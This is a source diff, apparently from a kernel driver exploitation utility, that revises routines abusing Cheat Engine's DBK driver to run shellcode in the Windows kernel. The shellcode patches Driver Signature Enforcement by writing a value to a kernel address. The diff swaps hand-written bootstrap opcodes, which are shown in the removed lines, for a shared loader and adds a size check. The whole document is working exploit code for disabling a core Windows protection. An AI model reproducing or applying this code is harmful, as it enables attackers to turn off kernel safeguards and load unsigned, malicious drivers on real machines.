@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.20
 *
-*  DATE:        14 Feb 2022
+*  DATE:        16 Feb 2022
 *
 *  Cheat Engine's DBK driver routines.
 *
@@ -36,7 +36,7 @@
 #define DBK_SC_MAX_SIZE PAGE_SIZE
 #define DBK_SHELLCODE_CI_PAYLOAD_SIZE DBK_SC_MAX_SIZE -\
     DBK_INIT_CODE_SIZE - \
-    sizeof(PVOID) - \
+    sizeof(PULONG_PTR) - \
     sizeof(ULONG_PTR)
 
 typedef struct _DBK_SHELLCODE_CI {
@@ -62,7 +62,7 @@ VOID WINAPI DbkDsePatchRoutine(
 }
 
 /*
-* DbkpBuildShellCode
+* DbkpBuildShellCodeDsePatch
 *
 * Purpose:
 *
@@ -76,6 +76,8 @@ BOOL DbkpBuildShellCodeDsePatch(
 )
 {
     ULONG procSize, maxSize;
+    PVOID pvInitCode;
+    ULONG initSize = 0;
 
     procSize = ScSizeOfProc((BYTE*)DbkDsePatchRoutine);
     maxSize = DBK_SHELLCODE_CI_PAYLOAD_SIZE;
@@ -91,40 +93,22 @@ BOOL DbkpBuildShellCodeDsePatch(
 #endif
     }
 
-    memcpy(ShellCode->Payload, DbkDsePatchRoutine, procSize);
+    RtlCopyMemory(ShellCode->Payload, DbkDsePatchRoutine, procSize);
+    RtlFillMemory(ShellCode->InitCode, sizeof(ShellCode->InitCode), 0xCC);
 
-    memset(ShellCode->InitCode, 0xCC, sizeof(DBK_INIT_CODE_SIZE));
+    pvInitCode = ScGetBootstrapLdr(KDU_SHELLCODE_V4, &initSize);
 
-    // 00 call +5
-    // 05 pop rcx
-    // 06 sub rcx, 5
-    // 0A jmps 10 
-    // 0B int 3
-    // 0C int 3
-    // 0D int 3
-    // 0E int 3
-    // 0F int 3
-    // 10 code
+    if (initSize > DBK_INIT_CODE_SIZE) {
 
-    //call +5
-    ShellCode->InitCode[0x0] = 0xE8;
-    ShellCode->InitCode[0x1] = 0x00;
-    ShellCode->InitCode[0x2] = 0x00;
-    ShellCode->InitCode[0x3] = 0x00;
-    ShellCode->InitCode[0x4] = 0x00;
+        supPrintfEvent(kduEventError,
+            "[!] Loader code size 0x%lX exceeds limit 0x%lX, abort\r\n",
+            initSize,
+            DBK_INIT_CODE_SIZE);
 
-    //pop rcx
-    ShellCode->InitCode[0x5] = 0x59;
+        return FALSE;
+    }
 
-    //sub rcx, 5
-    ShellCode->InitCode[0x6] = 0x48;
-    ShellCode->InitCode[0x7] = 0x83;
-    ShellCode->InitCode[0x8] = 0xE9;
-    ShellCode->InitCode[0x9] = 0x05;
-
-    // jmps 
-    ShellCode->InitCode[0xA] = 0xEB;
-    ShellCode->InitCode[0xB] = 0x04;
+    RtlCopyMemory(ShellCode->InitCode, pvInitCode, initSize);
 
     ShellCode->AddressOfVariable = (PULONG_PTR)Address;
     ShellCode->ValueToWrite = Value;
